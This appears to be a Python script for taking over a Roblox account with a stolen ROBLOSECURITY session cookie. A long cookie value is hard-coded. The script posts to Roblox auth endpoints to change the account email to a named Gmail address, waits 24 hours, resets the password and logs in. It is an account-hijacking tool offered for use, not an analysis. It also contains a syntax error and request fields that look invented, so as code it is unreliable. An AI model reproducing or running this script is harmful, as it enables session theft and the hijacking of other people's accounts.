import requests
import time

# Replace with the target ROBLOSECURITY cookie value
roblox_security = "11A2E2DE38354691EF15C9B5C3D035C8102F437989D603ADF29993C4300A6194C482449E1679C8F1D5C420DF234FFE54F4C5A8EA2E534AAE0CD24BD35C92D319AEE57D7A0E5819ED5C2B809C66768C10389D930C522D058F06D699887E5C41E06806E366B02C147C9A88C2962E726798ABDA3253D56BFD3338209D46071545B2F726618F0E6789E40082E0B31212D5E3FC21A1DD1371E869FBE1DB0BCD2E220E8F0F306DAAA3FFF214807C86EEB360CD3EF687159F5D5B7D5CB95E00EE92F43C3EB57D96186B86DB912A70DB66B9D21794DFFA482C00A015491397042509C83C565F9C657F2B6B9B191A7B69F6423F0ED9928D9D4D678B56AC99DD48BF4F19465E4057B2A184D057DD1C60BE71C68AEA3E6E9B92633BA7D3FD165B1AE6E60FDAF137FA8754FB0A02017EBBB344BBB649E33FD5AAC622B14378AE383F153FFF237258B8C8F3E0A8FD55EB3D274059320E94E8E52F18777212EAB15ABD62176B0EB5F68A04AAC6DD167928DF0307AE15DA2607476C5E942409B6E6668B7373405957E248EF9918EA67F69F955E1F169AF0BE44515FA1B43A8C776590CD82884484DFEB26963623D448C69B2B0937789BD5555C9337F4C32989B4113CD440D15A1A12682827"

# Replace with the target RBXIDCHECK value
rbxidcheck = "e0fbab5f-a2c2-4a5e-b03a-38ad11f5d3cd"

# Make a POST request to change the password
session = requests.Session()
login_payload = {
    "rbxUserId": rbxidcheck,
    "roblox_security": roblox_security,
    "obscuredId": "",
    "password": "sabskasabias321",
    "confirmPassword": "sabskasabias321"
}
login_response = session.post("https://auth.roblox.com/v2/login", json=login_payload)

# Make a GET request to get the CSRF token
csrf_response = session.get("https://accountsettings.roblox.com/v1/settings/privacy")
csrf_token = csrf_response.cookies["XSRF-TOKEN"]

# Make a POST request to change the email
email_payload = {
    "email": "saba.mjavabadze@gmail.com",
    "password": "sabskasabias321",
    "csrfToken": csrf_token
}
email_response = session.post("https://accountsettings.roblox.com/v1/settings/email", json=email_payload)

# Wait 24 hours for the email change to take effect
time.sleep(86400)

# Make a POST request to reset the password
reset_payload = {
    "email": "saba.mjavabadze@gmail.com",
    "csrfToken": csrf_token
}
reset_response = session.post("https://auth.roblox.com/v2/password/reset", json=reset_payload)

# Follow the link in the email to reset the password
reset_link = reset_response.json()["resetUrl"]
session.get(reset_link)

# Set the new password
new_password = "sabskasabias321"
reset_payload = {
    "password": new_password,
    "confirmPassword": new_password
}
reset_response = session.post(reset_link, json=reset_payload)

# Log in with the new password
login_payload["password"] = new_password)
login_response = session.post("https://auth.roblox.com/v2/login", json=login_payload)